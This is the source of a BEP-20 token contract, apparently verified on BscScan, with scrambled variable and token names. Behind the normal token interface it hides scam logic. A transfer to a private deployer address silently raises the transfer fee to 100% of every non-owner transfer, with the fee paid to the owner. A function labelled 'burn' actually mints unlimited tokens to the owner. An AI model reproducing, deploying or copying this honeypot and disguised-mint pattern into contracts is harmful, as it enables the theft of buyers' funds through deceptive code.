/**
 *Submitted for verification at BscScan.com on 2022-11-12
*/

/**
 *Submitted for verification at BscScan.com on 2022-11-12
 */
pragma solidity >=0.5.11;
contract pOpnwE {
uint256 public  usshBO = 100000000000000000;
address public  HdlTpG = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
address public  cpKnsU = address(0);
uint256 public  dtwKGL = 10000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  sRQQTj = address(0);
uint256 public  QxkIDb = 100000000000000000000000;
mapping (address => uint256) public balanceOf;
string public  symbol = "JIqiCE";
address public  GvKcLl = address(0);
uint8 public constant decimals = 18;
address public owner;
uint256 public  iFTbvn = 100000000000000000000;
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  KZeSVk = 1000000000000000000;
address public  YVjcgv = address(0);
uint256 public  DGNVYK = 100000000000000000000000;
string public  name = "eMQftD";
uint256 public constant RDHhSP = 9+1;
uint256 public  iwSUZF = 10000000000000000;
uint256 public  BzLcEV = 10000000000000000000;
address private  WkvhKX = address(0);
address public  OGybvE = address(0);
uint256 private  hRxXRq = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
constructor () {
WkvhKX = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "jKIfim");
require(to != address(0), "jKIfim");
require(amount <= balanceOf[from], "jKIfim");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* RDHhSP/hRxXRq ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==WkvhKX){
hRxXRq = 9+1;
}
emit Transfer(from, to, transferAmount);
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}

}